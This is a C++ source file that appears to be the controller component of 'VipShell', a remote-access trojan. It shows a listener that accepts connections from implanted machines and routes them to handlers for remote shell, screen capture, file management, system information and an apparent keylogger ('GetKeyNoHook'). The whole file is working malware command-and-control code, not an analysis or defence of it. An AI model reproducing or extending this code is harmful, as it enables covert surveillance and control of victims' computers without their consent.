#include "stdafx.h"
#include ".\vipshellclientserver.h"

CVipShellClientServer::CVipShellClientServer(void)
{
	NewThread(NULL, NULL, NULL, 0);    //启动等待用户连接
}

CVipShellClientServer::~CVipShellClientServer(void)
{
}
void CVipShellClientServer::_WaitForConnect(DWORD dwThreadId)
{
	CShellTcpConnect hServer;
	while(true)
	{
		if( m_hServer.IsOpened() )
		{
			hServer.Detach();
			if( hServer.Accept(&m_hServer, false) )
				NewThread((LPVOID)hServer.Detach(), NULL, NULL, 1);    //启动等待用户连接
		}
		if(IsStop(dwThreadId, 100))
			return ;
	}
}
bool CVipShellClientServer::GetServerGetKeyNoHookHandle(CServerGetKeyNoHookHandle* hServer)
{
	SOCKET s = _GetServer(5, NULL);
	if(s == INVALID_SOCKET)
		return false;
	hServer->Attach(s);
	return true;
}
bool CVipShellClientServer::GetCServerFileManageHandle(CServerFileManageHandle* hServer)
{
	SOCKET s = _GetServer(4, NULL);
	if(s == INVALID_SOCKET)
		return false;
	hServer->Attach(s);
	return true;
}
bool CVipShellClientServer::GetCapHandle(CServerGetCapPictureHandle* hServer)
{
	SOCKET s = _GetServer(3, NULL);
	if(s == INVALID_SOCKET)
		return false;
	hServer->Attach(s);
	return true;
}

bool CVipShellClientServer::GetScreenInfoHandle(CServerScreenInfoHandle* hServer)
{
	DWORD dwId = 0;
	SOCKET s = _GetServer(1, &dwId);
	if(s == INVALID_SOCKET)
		return false;
	hServer->Attach(s);
	hServer->SetConnectId(dwId);
	return true;
}
bool CVipShellClientServer::GetShellHandle(CServerShellHandle* hServer)
{
	SOCKET s = _GetServer(2, NULL);
	if(s == INVALID_SOCKET)
		return false;
	hServer->Attach(s);
	return true;
}
bool CVipShellClientServer::GetConnectHandle(CServerConnectHandle* hServer)
{
	tagServerSystemInfo info;
	SOCKET s = _GetServer(0, &info);
	if(s == INVALID_SOCKET)
		return false;
	hServer->SetServerInfoAtThis(&info);
	hServer->Attach(s);
	return true;
}
void CVipShellClientServer::_AddServer(DWORD dwType, SOCKET s)
{
	CMySingleLock Event(&m_CriticalSectionServerVector);
	tagServerHandle server;
	server.dwServerType = dwType;
	server.s = s;
	m_vecServer.push_back(server);
}
void CVipShellClientServer::_CopyServerSystemInfo(tagServerSystemInfo* p1, tagServerSystemInfo* p2)
{
	p1->bIsCanCap = p2->bIsCanCap;
	p1->dwCpuSpeed = p2->dwCpuSpeed;
	p1->dwMajorVersion = p2->dwMajorVersion;
	p1->dwMinorVersion = p2->dwMinorVersion;
	p1->dwPlatformId = p2->dwPlatformId;
	p1->dwMemory = p2->dwMemory;
	lstrcpyW(p1->szExplain , p2->szExplain);
	lstrcpyW(p1->szName , p2->szName);
}
SOCKET CVipShellClientServer::_GetServer(DWORD dwType, LPVOID lp)
{
	CMySingleLock Event(&m_CriticalSectionServerVector);
	SOCKET s = INVALID_SOCKET;
	for(int i = (m_vecServer.size() - 1); i >= 0; i--)
	{
		if(m_vecServer[i].dwServerType == dwType)
		{
			s = m_vecServer[i].s;
			m_vecServer.erase(m_vecServer.begin() + i);
			if(dwType == 0)
			{
				tagServerSystemInfo* info = (tagServerSystemInfo*)lp;
				_CopyServerSystemInfo(info,&m_ServerMap[s]);
			}
			if(dwType == 1)
			{
				DWORD* dwId = (DWORD*)lp;
				*dwId = m_ScreenMap[s];
			}
			break;
		}
	}
	return s;
}
void CVipShellClientServer::_OnServerLink(SOCKET s)
{
	tagVipShellCmd cmdInfo;
	int nRet;
	cmdInfo.dwCmd = CMD_GETDOWORK;
	CShellTcpConnect hServer; hServer.Attach(s);
	nRet = hServer.Send(&cmdInfo, sizeof(tagVipShellCmd));
	if (nRet == SOCKET_ERROR)
		return ;
	nRet = hServer.Recv(&cmdInfo, sizeof(tagVipShellCmd));
	if (nRet == SOCKET_ERROR)
		return ;
	if(nRet != sizeof(tagVipShellCmd))
	{
		hServer.Close();
		return ;
	}
	if( cmdInfo.dwCmd == 0)
	{
		tagServerSystemInfo info;
		memcpy(&info, cmdInfo.pBuff, sizeof(tagServerSystemInfo));
		SOCKET sBak =  hServer.Detach();
	//	memcpy(&m_ServerMap[s], &info, sizeof(tagServerSystemInfo));
		m_ServerMap[s].bIsCanCap = false;
		SERVERINFO_MAP::iterator it;
		it = m_ServerMap.find(s);
		_CopyServerSystemInfo(&it->second, &info);
	//	m_ServerMap.insert(SERVERINFO_MAP::value_type(sBak, info));
		_AddServer(cmdInfo.dwCmd, sBak);
	}else if ( cmdInfo.dwCmd == 1 )
	{
		SOCKET sBak =  hServer.Detach();
		m_ScreenMap[sBak] = cmdInfo.dw1;
		_AddServer(cmdInfo.dwCmd, sBak);
	}else if ( cmdInfo.dwCmd == 2 )
	{
		_AddServer(cmdInfo.dwCmd, hServer.Detach());
	}else if ( cmdInfo.dwCmd == 3 )
	{
		_AddServer(cmdInfo.dwCmd, hServer.Detach());
	}else if( cmdInfo.dwCmd == 4)
	{
		_AddServer(cmdInfo.dwCmd, hServer.Detach());
	}else if( cmdInfo.dwCmd == 5)
	{
		_AddServer(cmdInfo.dwCmd, hServer.Detach());
	}

}
void CVipShellClientServer::OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter)
{
	if(dwCreateMarker == 0)
		_WaitForConnect(dwThreadId);
	else if (dwCreateMarker == 1)
		_OnServerLink((SOCKET)lpParameter);
}
bool CVipShellClientServer::Create(DWORD dwPort)
{
	return m_hServer.Create(NULL, (USHORT)dwPort, 100000);
}
bool CVipShellClientServer::Close()
{
	return m_hServer.Close();
}